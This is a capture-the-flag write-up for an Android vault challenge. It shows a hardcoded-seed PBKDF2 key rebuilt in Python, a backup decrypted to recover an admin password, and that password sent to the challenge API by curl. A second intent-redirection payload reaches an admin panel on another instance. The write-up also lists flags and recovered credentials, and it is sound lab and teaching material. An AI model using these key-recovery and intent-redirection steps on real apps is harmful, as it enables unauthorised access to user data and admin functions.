# Phantom Decrypt

> Android vault app with a hardcoded KDF seed. Rebuild the AES-256 key, decrypt the backup, and use the recovered master password against the API.
> **Flag:** `flag{622b8b6a3f0b89a7}`

---

## Solution

### 1. Understand the blob

`vault_decrypt.py` documents the format of `vault_backup.enc`:

```text
[ 12-byte IV ][ ciphertext ][ 16-byte GCM tag ]
```

The AES-256 key must be derived from `CryptoManager.java`.

### 2. Read the KDF parameters

```text
KDF:        PBKDF2WithHmacSHA256
Seed:       fluidvault_master_seed_2026
Salt:       a915c3e00dbb5a55ba13d7cdaf3a126e
Iterations: 10000
Key length: 256 bits
Passphrase: SEED + deviceId
```

`getDeviceIdentifier()` uses `Build.SERIAL` and falls back to the fixed string
`DEFAULT_DEVICE_ID` when it is null or `unknown`. The challenge needs no device,
so the fallback applies:

```text
Integer.toHexString("DEFAULT_DEVICE_ID".hashCode()) = c8e21b06
```

### 3. Derive and decrypt

```python
import hashlib
key = hashlib.pbkdf2_hmac(
    'sha256',
    b'fluidvault_master_seed_2026c8e21b06',
    bytes.fromhex('a915c3e00dbb5a55ba13d7cdaf3a126e'),
    10000, 32).hex()
# c70cf882eaf48e1da954f0105594fef19704aeae00e86756501957a033faa91a
```

```bash
$ python3 vault_decrypt.py c70cf882eaf48e1da954f0105594fef19704aeae00e86756501957a033faa91a
```

The decrypted JSON contains the Admin Portal entry:

```text
Name:     Admin Portal
User:     admin
Password: Fl00d_G4t3s_0p3n!
URL:      https://vault.internal.fluidvault.io/admin
```

### 4. Use it against the API

`VaultApiClient.java` shows `POST /api/vault/admin` with
`{"master_password":"..."}`:

```bash
$ curl -s -X POST https://02cfcce8d475f2de.chal.ctf.ae/api/vault/admin \
  -H 'Content-Type: application/json' \
  --data '{"master_password":"Fl00d_G4t3s_0p3n!"}'
{"authenticated":true,"flag":"flag{622b8b6a3f0b89a7}","role":"admin"}
```

### 5. Flag

```text
flag{622b8b6a3f0b89a7}
```

### New instance (current run)

The second deployment used an intent-redirection flow instead:

```bash
$ curl -sk -X POST 'https://178dc426ad654ab0.chal.ctf.ae/api/intent/send' \
  -H 'Content-Type: application/json' \
  --data '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_intent":{"component":"com.fluidctf.messenger.AdminPanelActivity","extras":{}}}}'
{"activity":"com.fluidctf.messenger.AdminPanelActivity","api_response":{"data":"flag{d9c0c1c24066e39b}","endpoint":"/api/admin/flag"},"result":"Admin panel accessed successfully.","status":"launched"}
```

```text
flag{d9c0c1c24066e39b}
```

## Lesson

Client-side crypto with a constant seed, constant salt and constant device ID is
reversible by anyone who reads the APK. The backup protected the data only until
the first decompiler run.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
